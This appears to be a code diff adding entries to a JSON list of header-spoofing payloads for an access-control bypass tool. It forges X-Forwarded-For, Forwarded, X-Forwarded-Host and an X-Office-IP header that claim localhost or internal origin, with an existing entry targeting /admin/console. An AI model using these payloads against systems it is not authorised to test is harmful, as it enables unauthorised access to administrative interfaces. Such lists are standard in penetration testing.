@@ -125,5 +125,51 @@
     "headers": {
       "X-Rewrite-URL": "/admin/console"
     }
+  },
+  {
+    "name": "X-Office-IP",
+    "description": "Pin X-Office-IP to /admin/console",
+    "headers": {
+      "X-Office-IP": "1"
+    }
+  },
+  {
+    "name": "x-forwarded-for-chain",
+    "description": "Forge multi-hop X-Forwarded-For chain",
+    "headers": {
+      "X-Forwarded-For": "127.0.0.1, {spoof_ip}"
+    }
+  },
+  {
+    "name": "forwarded-standard",
+    "description": "Send RFC 7239 Forwarded header with internal host",
+    "headers": {
+      "Forwarded": "for={spoof_ip};host=127.0.0.1;proto=http"
+    }
+  },
+  {
+    "name": "x-forwarded-host-local",
+    "description": "Override upstream host via X-Forwarded-Host",
+    "headers": {
+      "X-Forwarded-Host": "127.0.0.1"
+    }
+  },
+  {
+    "name": "x-forwarded-proto-https",
+    "description": "Force HTTPS proto in X-Forwarded-Proto",
+    "headers": {
+      "X-Forwarded-Proto": "https"
+    }
+  },
+  {
+    "name": "x-forwarded-port-override",
+    "description": "Override upstream port in X-Forwarded-Port",
+    "headers": {
+      "X-Forwarded-Port": "443"
+    }
   }
 ]
+
+
+
+
